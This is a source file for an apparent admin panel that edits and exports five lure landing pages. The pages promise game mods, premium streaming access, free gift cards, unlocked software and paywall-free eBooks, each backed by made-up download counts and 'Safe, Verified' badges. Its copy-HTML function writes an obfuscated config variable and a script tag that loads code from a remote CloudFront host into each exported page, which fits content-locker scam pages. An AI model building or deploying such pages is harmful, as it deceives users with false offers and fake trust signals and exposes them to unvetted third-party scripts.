<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex">
  <title>Panel</title>
  <style>
    :root {
      --bg: #0f0f14;
      --surface: #1a1a24;
      --border: #2a2a3a;
      --text: #e4e4ec;
      --muted: #7a7a8a;
      --accent: #ea5e2e;
      --accent2: #6366f1;
      --green: #2e8b57;
      --input-bg: #12121a;
      --hover: #222230;
      --danger: #ef4444;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
      background: var(--bg); color: var(--text); min-height: 100vh;
      display: flex; -webkit-font-smoothing: antialiased;
    }

    /* Sidebar */
    .sidebar {
      width: 240px; background: var(--surface); border-right: 1px solid var(--border);
      display: flex; flex-direction: column; flex-shrink: 0;
    }
    .sidebar-head {
      padding: 20px; border-bottom: 1px solid var(--border);
      font-size: 13px; font-weight: 700; letter-spacing: 0.5px;
      text-transform: uppercase; color: var(--muted);
    }
    .sidebar-nav { flex:1; overflow-y:auto; padding:8px; }
    .sidebar-nav button {
      display: flex; align-items: center; gap: 10px;
      width: 100%; padding: 10px 12px; background: none; border: none;
      border-radius: 8px; color: var(--text); font-family: inherit;
      font-size: 13px; cursor: pointer; transition: all 0.15s; text-align: left;
    }
    .sidebar-nav button:hover { background: var(--hover); }
    .sidebar-nav button.active { background: rgba(99,102,241,0.12); color: var(--accent2); }
    .sidebar-nav button .nicon { font-size: 18px; width: 24px; text-align: center; flex-shrink: 0; }
    .sidebar-nav button .nurl { font-size: 11px; color: var(--muted); margin-left: auto; }
    .sidebar-nav button.active .nurl { color: var(--accent2); opacity: 0.7; }
    .sidebar-foot {
      padding: 12px; border-top: 1px solid var(--border);
      display: flex; flex-direction: column; gap: 6px;
    }
    .sidebar-foot button {
      width: 100%; padding: 8px; border-radius: 6px; border: none;
      font-family: inherit; font-size: 12px; cursor: pointer; transition: all 0.15s;
    }
    .btn-copy {
      background: var(--accent); color: #fff; font-weight: 600;
    }
    .btn-copy:hover { filter: brightness(1.1); }
    .btn-reset {
      background: transparent; color: var(--muted); border: 1px solid var(--border)!important;
    }
    .btn-reset:hover { color: var(--danger); border-color: var(--danger)!important; }

    /* Main */
    .main {
      flex:1; display:flex; flex-direction:column; overflow:hidden;
    }
    .main-head {
      padding: 16px 24px; border-bottom: 1px solid var(--border);
      display:flex; align-items:center; justify-content:space-between;
    }
    .main-head h2 { font-size: 16px; font-weight: 600; }
    .main-head .badge { font-size: 11px; color: var(--muted); background: var(--surface); padding: 4px 10px; border-radius: 100px; }
    .main-body {
      flex:1; display:flex; overflow:hidden;
    }

    /* Editor */
    .editor {
      width: 380px; padding: 20px; overflow-y: auto; border-right: 1px solid var(--border);
      display:flex; flex-direction:column; gap:14px; flex-shrink:0;
    }
    .editor label {
      display:flex; flex-direction:column; gap:4px;
      font-size: 11px; font-weight: 600; text-transform: uppercase;
      letter-spacing: 0.5px; color: var(--muted);
    }
    .editor input, .editor textarea {
      width: 100%; padding: 8px 10px; background: var(--input-bg);
      border: 1px solid var(--border); border-radius: 6px;
      color: var(--text); font-family: monospace; font-size: 13px;
      transition: border-color 0.15s; resize: vertical;
    }
    .editor input:focus, .editor textarea:focus {
      outline: none; border-color: var(--accent2);
    }
    .editor textarea { min-height: 72px; line-height: 1.5; }
    .editor .row { display:flex; gap:8px; }
    .editor .row > * { flex:1; }
    .editor .hint { font-size: 10px; color: var(--muted); margin-top: -2px; }

    /* Preview */
    .preview {
      flex:1; padding: 20px; overflow-y:auto;
      display:flex; align-items:flex-start; justify-content:center;
      background: #fafaf8; /* match landing page bg */
    }
    .preview-wrap {
      width: 100%; max-width: 400px;
      background: #fff; border-radius: 14px; padding: 32px 24px 24px;
      box-shadow: 0 0 0 1px rgba(0,0,0,0.04), 0 8px 32px rgba(0,0,0,0.08);
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, system-ui, sans-serif;
    }
    .pv-icon {
      text-align: center; font-size: 32px; margin-bottom: 12px;
    }
    .pv-title {
      text-align: center; font-size: 22px; font-weight: 700;
      letter-spacing: -0.3px; color: #171717; margin-bottom: 8px;
    }
    .pv-sub {
      text-align: center; font-size: 14px; color: #6e6e74;
      margin-bottom: 20px; line-height: 1.5;
    }
    .pv-features {
      border: 1px solid #e6e4e0; border-radius: 12px;
      padding: 16px; margin-bottom: 20px;
    }
    .pv-features .pv-label {
      font-size: 10px; font-weight: 600; text-transform: uppercase;
      letter-spacing: 0.5px; color: #6e6e74; margin-bottom: 12px;
    }
    .pv-features .pv-item {
      font-size: 13px; color: #171717; display: flex; align-items: flex-start;
      gap: 8px; margin-bottom: 8px; line-height: 1.4;
    }
    .pv-features .pv-item:last-child { margin-bottom: 0; }
    .pv-features .pv-ck {
      flex-shrink: 0; width: 18px; height: 18px;
      background: rgba(46,139,87,0.10); border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 10px; color: #2e8b57; margin-top: 1px;
    }
    .pv-btn {
      display: block; width: 100%; padding: 14px;
      background: #ea5e2e; color: #fff; border: none; border-radius: 10px;
      font-family: inherit; font-size: 15px; font-weight: 700;
      text-align: center; margin-bottom: 16px;
    }
    .pv-proof {
      text-align: center; font-size: 12px; font-weight: 600;
      color: #171717; margin-bottom: 4px;
    }
    .pv-proof span { color: #ea5e2e; }
    .pv-tags {
      display: flex; justify-content: center; gap: 10px;
      font-size: 11px; color: #6e6e74; margin-bottom: 16px;
    }
    .pv-tags span { display: inline-flex; align-items: center; gap: 3px; }
    .pv-tags .pv-dt { width: 4px; height: 4px; border-radius: 50%; background: #2e8b57; }
    .pv-foot {
      text-align: center; font-size: 11px; color: #a0a0a6;
      border-top: 1px solid #e6e4e0; padding-top: 16px;
    }

    /* Toast */
    .toast {
      position: fixed; bottom: 24px; right: 24px;
      background: var(--accent2); color: #fff; padding: 10px 18px;
      border-radius: 8px; font-size: 13px; font-weight: 600;
      opacity: 0; transform: translateY(10px); transition: all 0.25s;
      pointer-events: none; z-index: 999;
    }
    .toast.show { opacity: 1; transform: translateY(0); }

    @media(max-width:900px) {
      body { flex-direction:column; }
      .sidebar { width:100%; flex-direction:row; overflow-x:auto; }
      .sidebar-head { display:none; }
      .sidebar-nav { display:flex; flex-direction:row; padding:4px; gap:2px; }
      .sidebar-nav button { width:auto; white-space:nowrap; padding:8px 12px; font-size:12px; }
      .sidebar-nav button .nurl { display:none; }
      .sidebar-foot { flex-direction:row; padding:8px; }
      .sidebar-foot button { flex:1; }
      .main-body { flex-direction:column; }
      .editor { width:100%; border-right:none; border-bottom:1px solid var(--border); }
      .preview { padding:16px; }
    }
  </style>
</head>
<body>

  <!-- Sidebar -->
  <aside class="sidebar">
    <div class="sidebar-head">Pages</div>
    <nav class="sidebar-nav" id="nav"></nav>
    <div class="sidebar-foot">
      <button class="btn-copy" onclick="copyHTML()">Copy HTML</button>
      <button class="btn-reset" onclick="resetCurrent()">Reset to default</button>
    </div>
  </aside>

  <!-- Main -->
  <main class="main">
    <div class="main-head">
      <h2 id="editorTitle">Gaming</h2>
      <span class="badge" id="editorUrl">/gaming</span>
    </div>
    <div class="main-body">
      <!-- Editor form -->
      <div class="editor" id="editor"></div>
      <!-- Live preview -->
      <div class="preview" id="preview"></div>
    </div>
  </main>

  <div class="toast" id="toast"></div>

  <script>
  // ══════════════════════════════════════
  // DEFAULTS — mirrors the actual landing pages
  // ══════════════════════════════════════
  const DEFAULTS = {
    gaming: {
      icon:"🎮", title:"Game Mod Installer",
      subtitle:"Premium features unlocked for your favorite mobile games — no root required.",
      features:["Unlimited in-game currency & gems","All premium characters unlocked","Ad-free experience, no root needed","Works on Android & iOS devices"],
      cta:"Download Now", count:"14,280", countLabel:"downloads this week",
      tags:["Safe","Verified","v2.4.1"],
      footnote:"Compatible with most popular mobile games.<br>Updated regularly for new game versions."
    },
    streaming: {
      icon:"📺", title:"StreamPass",
      subtitle:"Access premium shows & movies across all your favorite platforms.",
      features:["Full access to premium streaming libraries","HD quality, no buffering limits","Works across all your devices","Updated daily with new content"],
      cta:"Get Access", count:"8,920", countLabel:"active users this week",
      tags:["Safe","Verified","v3.1.0"],
      footnote:"Compatible with all major streaming services.<br>New content added every day."
    },
    rewards: {
      icon:"🎁", title:"RewardDrop",
      subtitle:"Claim gift cards & premium rewards from your favorite brands.",
      features:["Gift cards up to $100 from top retailers","Premium brand samples & products","New rewards added every week","Instant digital delivery"],
      cta:"Claim Reward", count:"6,450", countLabel:"claimed this week",
      tags:["Safe","Verified","Updated"],
      footnote:"Available in select regions.<br>New rewards dropped regularly."
    },
    tools: {
      icon:"⚡", title:"ToolVault",
      subtitle:"Premium apps & software — unlocked, no subscriptions, no limits.",
      features:["Premium apps with all features unlocked","No monthly fees or subscriptions","Safe downloads, scanned & verified","Works on desktop & mobile"],
      cta:"Get Access", count:"11,300", countLabel:"downloads this week",
      tags:["Safe","Verified","v1.8.2"],
      footnote:"New tools added regularly.<br>All downloads scanned and verified clean."
    },
    library: {
      icon:"📚", title:"LibVault",
      subtitle:"Premium guides, eBooks & courses — unlimited access, no paywalls.",
      features:["Premium eBooks across all genres","Online courses & learning materials","Study guides, cheat sheets & templates","New content added every week"],
      cta:"Access Library", count:"9,750", countLabel:"members joined this week",
      tags:["Safe","Verified","Updated"],
      footnote:"Instant access to the full library.<br>New titles and courses added regularly."
    }
  };

  // ══════════════════════════════════════
  // STATE
  // ══════════════════════════════════════
  const LS_KEY = 'lp_configs';
  let configs = {};
  let current = 'gaming';

  function load() {
    try {
      const raw = localStorage.getItem(LS_KEY);
      if (raw) configs = JSON.parse(raw);
    } catch(e) { configs = {}; }
    // Merge defaults for any missing keys
    for (const k in DEFAULTS) {
      if (!configs[k]) configs[k] = JSON.parse(JSON.stringify(DEFAULTS[k]));
    }
  }

  function save() {
    localStorage.setItem(LS_KEY, JSON.stringify(configs));
  }

  function get(k) { return configs[k] || DEFAULTS[k]; }

  // ══════════════════════════════════════
  // RENDER SIDEBAR
  // ══════════════════════════════════════
  const NICHE_INFO = {
    gaming:    { label:'Gaming',    url:'/gaming' },
    streaming: { label:'Streaming', url:'/streaming' },
    rewards:   { label:'Rewards',   url:'/rewards' },
    tools:     { label:'Tools',     url:'/tools' },
    library:   { label:'Library',   url:'/library' }
  };

  function renderNav() {
    const nav = document.getElementById('nav');
    nav.innerHTML = '';
    for (const k in NICHE_INFO) {
      const btn = document.createElement('button');
      btn.className = k === current ? 'active' : '';
      btn.innerHTML = `<span class="nicon">${get(k).icon}</span> ${NICHE_INFO[k].label} <span class="nurl">${NICHE_INFO[k].url}</span>`;
      btn.onclick = () => select(k);
      nav.appendChild(btn);
    }
  }

  // ══════════════════════════════════════
  // SELECT NICHE
  // ══════════════════════════════════════
  function select(key) {
    current = key;
    document.getElementById('editorTitle').textContent = NICHE_INFO[key].label;
    document.getElementById('editorUrl').textContent = NICHE_INFO[key].url;
    renderNav();
    renderEditor();
    renderPreview();
  }

  // ══════════════════════════════════════
  // RENDER EDITOR
  // ══════════════════════════════════════
  function renderEditor() {
    const c = get(current);
    const ed = document.getElementById('editor');
    ed.innerHTML = `
      <label>Icon (emoji)
        <input type="text" data-key="icon" value="${esc(c.icon)}" placeholder="🎮">
      </label>
      <label>Title
        <input type="text" data-key="title" value="${esc(c.title)}" placeholder="Page title">
      </label>
      <label>Subtitle
        <input type="text" data-key="subtitle" value="${esc(c.subtitle)}" placeholder="Short description">
      </label>
      <label>Features (one per line)
        <textarea data-key="features" placeholder="Feature 1&#10;Feature 2&#10;Feature 3&#10;Feature 4">${c.features.join('\n')}</textarea>
      </label>
      <div class="row">
        <label>Button text
          <input type="text" data-key="cta" value="${esc(c.cta)}" placeholder="Download Now">
        </label>
        <label>Count
          <input type="text" data-key="count" value="${esc(c.count)}" placeholder="14,280">
        </label>
      </div>
      <label>Count label
        <input type="text" data-key="countLabel" value="${esc(c.countLabel)}" placeholder="downloads this week">
      </label>
      <label>Tags (comma-separated)
        <input type="text" data-key="tags" value="${c.tags.join(', ')}" placeholder="Safe, Verified, v1.0">
      </label>
      <label>Footnote (use &lt;br&gt; for line break)
        <textarea data-key="footnote" placeholder="Line 1&lt;br&gt;Line 2">${esc(c.footnote)}</textarea>
      </label>
    `;

    // Auto-save on input
    ed.querySelectorAll('input, textarea').forEach(el => {
      el.addEventListener('input', () => {
        const key = el.dataset.key;
        let val = el.value;
        if (key === 'features') {
          configs[current][key] = val.split('\n').filter(l => l.trim());
        } else if (key === 'tags') {
          configs[current][key] = val.split(',').map(t => t.trim()).filter(Boolean);
        } else if (key === 'footnote') {
          configs[current][key] = val;
        } else {
          configs[current][key] = val;
        }
        save();
        renderNav();
        renderPreview();
      });
    });
  }

  // ══════════════════════════════════════
  // RENDER PREVIEW
  // ══════════════════════════════════════
  function renderPreview() {
    const c = get(current);
    const pv = document.getElementById('preview');
    pv.innerHTML = `
      <div class="preview-wrap">
        <div class="pv-icon">${c.icon}</div>
        <div class="pv-title">${esc(c.title)}</div>
        <div class="pv-sub">${esc(c.subtitle)}</div>
        <div class="pv-features">
          <div class="pv-label">What's included</div>
          ${c.features.map(f => `<div class="pv-item"><span class="pv-ck">✓</span> ${esc(f)}</div>`).join('')}
        </div>
        <div class="pv-btn">${esc(c.cta)} ↓</div>
        <div class="pv-proof"><span>${esc(c.count)}</span> ${esc(c.countLabel)}</div>
        <div class="pv-tags">${c.tags.map(t => `<span><span class="pv-dt"></span> ${esc(t)}</span>`).join('')}</div>
        <div class="pv-foot">${c.footnote}</div>
      </div>
    `;
  }

  // ══════════════════════════════════════
  // ACTIONS
  // ══════════════════════════════════════
  function copyHTML() {
    const c = get(current);
    const featuresStr = c.features.map(f => `      "${escAttr(f)}"`).join(',\n');
    const tagsStr = c.tags.map(t => `"${escAttr(t)}"`).join(', ');

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="${escAttr(c.title)}">
  <title>${escAttr(c.title)}</title>

  <script>
  const CONFIG = {
    icon: "${c.icon}",
    title: "${escAttr(c.title)}",
    subtitle: "${escAttr(c.subtitle)}",
    features: [
${featuresStr}
    ],
    cta: "${escAttr(c.cta)}",
    count: "${escAttr(c.count)}",
    countLabel: "${escAttr(c.countLabel)}",
    tags: [${tagsStr}],
    footnote: "${escAttr(c.footnote)}"
  };
  <\\/script>

  <script type="text/javascript">
    var PgAVd_Pgl_sUJrYc = {"it": 4618094, "key": "fd500"};
  <\\/script>
  <script src="https://d1g1lhd4vferpn.cloudfront.net/29763fc.js"><\\/script>

  <!-- COPY THE REST FROM THE ORIGINAL FILE: <style>...</style> <body>...</body> <script>...</script> -->
</head>
<body>
  <!-- ... body from the original landing page template ... -->
</body>
</html>`;

    navigator.clipboard.writeText(html).then(() => toast('HTML copied! Paste into the landing page file.'));
  }

  function resetCurrent() {
    if (!confirm(`Reset ${NICHE_INFO[current].label} to default?`)) return;
    configs[current] = JSON.parse(JSON.stringify(DEFAULTS[current]));
    save();
    renderNav();
    renderEditor();
    renderPreview();
    toast('Reset to defaults');
  }

  // ══════════════════════════════════════
  // HELPERS
  // ══════════════════════════════════════
  function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
  function escAttr(s) { return String(s).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

  let toastTimer;
  function toast(msg) {
    const el = document.getElementById('toast');
    el.textContent = msg;
    el.classList.add('show');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => el.classList.remove('show'), 2000);
  }

  // ══════════════════════════════════════
  // INIT
  // ══════════════════════════════════════
  load();
  renderNav();
  select('gaming');
  </script>
</body>
</html>
